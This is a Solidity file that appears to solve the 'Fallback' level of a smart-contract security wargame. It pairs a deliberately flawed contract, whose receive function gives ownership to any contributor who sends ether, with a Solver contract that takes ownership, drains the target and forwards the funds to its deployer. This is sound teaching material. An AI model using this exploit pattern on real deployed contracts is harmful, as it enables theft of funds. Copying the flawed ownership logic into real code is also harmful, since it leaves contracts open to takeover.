// Layout of Contract:
// version
// imports
// errors
// interfaces, libraries, contracts
// Type declarations
// State variables
// Events
// Modifiers
// Functions

// Layout of Functions:
// constructor
// receive function (if exists)
// fallback function (if exists)
// external
// public
// internal
// private
// view & pure functions

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}

///////////////////
// interface
///////////////////
interface IFallback {
    function contribute() external payable;

    function owner() external view returns (address);

    function withdraw() external;
}

//notice this attack contract will not pass the test cause the onwership is the solver contract instead of your account
//this contract aim to proof of concept of how to attack the contract
contract Solver {
    ///////////////////
    // Errors
    ///////////////////
    error TransferFailed();

    ///////////////////
    // State variables
    ///////////////////
    address payable target;
    address owner;

    ///////////////////
    // Modifiers
    ///////////////////
    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    ///////////////////
    // Functions
    ///////////////////
    constructor(address payable _target) {
        target = _target;
        owner = msg.sender;
    }

    ///////////////////
    // External Functions
    ///////////////////
    function solve() external payable {
        IFallback(target).contribute{value: 0.0001 ether}();
        (bool success,) = target.call{value: 0.0001 ether}("");
        if (!success) {
            revert TransferFailed();
        }
        IFallback(target).withdraw();
    }

    function checkIsSolved() external view returns (bool) {
        return target.balance == 0;
    }

    function withdrawforonwer() external onlyOwner {
        (bool success,) = payable(owner).call{value: address(this).balance}("");
        if (!success) {
            revert TransferFailed();
        }
    }

    receive() external payable {}
}
